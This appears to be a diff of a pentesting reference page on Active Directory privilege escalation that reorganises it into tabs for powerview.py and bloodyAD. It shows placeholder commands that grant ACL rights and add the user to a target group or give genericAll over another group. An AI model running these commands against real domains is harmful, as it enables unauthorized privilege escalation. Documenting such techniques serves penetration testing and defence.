@@ -7,9 +7,11 @@ tags: ["addself", "active directory", "ad", "domain controller", "Windows", "pow
 ---
 ### Privesc #1: Add self to group (From Linux)
 
-#### powerview.py
+{{< tab set1 tab1 active >}}powerview.py{{< /tab >}}
+{{< tab set1 tab2 >}}bloodyAD{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
 
-[powerview.py](https://github.com/aniqfakhrul/powerview.py)
+<div>
 
 ```bash
 # Connect
@@ -36,11 +38,17 @@ Add-DomainObjectAcl -TargetIdentity <ANOTHER_GROUP> -PrincipalIdentity <USERNAME
 Get-DomainObjectAcl -Identity <TARGET_USER_IN_ANOTHER_GROUP> -Where "SecurityIdentifier contains <USERNAME>"
 ```
 
-#### bloodAD
+</div>
 
-[bloodyAD](https://github.com/CravateRouge/bloodyAD)
+<small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+
+<div>
 
 ```bash
+# Add self to group
 python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> add groupMember <TARGET_GROUP> <USERNAME>
 ```
 
@@ -48,5 +56,11 @@ python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> add grou
 # After getting full control of target group (e.g. TARGET_GROUP has genericall over ANOTHER_GROUP)
 python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> add genericAll 'OU=<ANOTHER_GROUP>,DC=<EXAMPLE>,DC=<COM>' <USERNAME>
 ```
+
+</div>
+
+<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>
+
+{{< /tabcontent >}}
 
 <br>
